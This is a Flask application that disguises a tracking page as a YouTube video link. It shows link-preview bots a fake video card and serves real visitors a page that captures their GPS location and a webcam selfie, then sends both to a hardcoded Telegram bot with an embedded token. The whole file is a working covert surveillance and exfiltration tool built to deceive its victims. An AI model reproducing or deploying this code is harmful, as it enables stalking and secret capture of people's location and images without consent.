from flask import Flask, render_template, request, jsonify, redirect, send_from_directory
import requests
import base64
from io import BytesIO
import os

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = '8280216938:AAEwCN0U8HkhNqikde5Nq3ODTgpaZlNQZhQ'
TELEGRAM_CHAT_ID = '7343057223'

# In-memory configuration
current_config = {
    "youtube_url": "https://youtu.be/pWPSWwK7w8w?si=BVRHs_Kc_STKulz4",
    "video_title": "Taarak Mehta Ka Ooltah Chashmah - Latest Episode",
    "video_description": "Comedy Show - New Episode",
    "video_thumbnail": "https://i.ytimg.com/vi/pWPSWwK7w8w/maxresdefault.jpg"
}

@app.route('/static/<filename>')
def static_files(filename):
    return send_from_directory('templates', filename)

def send_location_to_telegram(lat, lon):
    location_url = f"https://www.google.com/maps?q={lat},{lon}"
    message = f"🔴 LIVE LOCATION CAPTURED\n📍 {location_url}\n⏰ {request.headers.get('User-Agent','Unknown')}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
    return requests.post(url, data=payload).json()

def send_photo_to_telegram(photo_b64):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    photo_data = BytesIO(base64.b64decode(photo_b64.split(',')[1]))
    files = {'photo': photo_data}
    data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': '📸 LIVE SELFIE CAPTURED\n🕐 Real-time capture'}
    return requests.post(url, data=data, files=files).json()

@app.route('/')
def index():
    ua = request.headers.get('User-Agent', '').lower()
    bots = ['whatsapp', 'facebook', 'twitter', 'telegram', 'bot', 'crawler', 'spider']
    is_bot = any(k in ua for k in bots)
    
    if is_bot:
        return render_template('youtube_preview.html',
                             title=current_config['video_title'],
                             description=current_config['video_description'],
                             thumbnail=current_config['video_thumbnail'],
                             youtube_url=current_config['youtube_url'])
    else:
        return render_template('index2.0.html')

@app.route('/admin')
def admin():
    return render_template('admin.html', config=current_config)

@app.route('/update_video', methods=['POST'])
def update_video():
    global current_config
    data = request.json or {}
    
    current_config.update({
        "youtube_url": data.get('youtube_url', current_config['youtube_url']),
        "video_title": data.get('video_title', current_config['video_title']),
        "video_description": data.get('video_description', current_config['video_description']),
        "video_thumbnail": data.get('video_thumbnail', current_config['video_thumbnail'])
    })
    
    return jsonify(status='success', message='Video updated successfully!')

@app.route('/send_data', methods=['POST'])
def send_data():
    data = request.json or {}
    lat, lon, selfie = data.get('latitude'), data.get('longitude'), data.get('selfie')
    
    if not (lat and lon and selfie):
        return jsonify(status='Missing data'), 400
    
    loc_res = send_location_to_telegram(lat, lon)
    pic_res = send_photo_to_telegram(selfie)
    
    if loc_res.get('ok') and pic_res.get('ok'):
        return jsonify(status='Success, data sent to Telegram')
    else:
        return jsonify(status='Failed to send data'), 500

@app.route('/youtube')
def youtube_redirect():
    return redirect(current_config['youtube_url'])

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
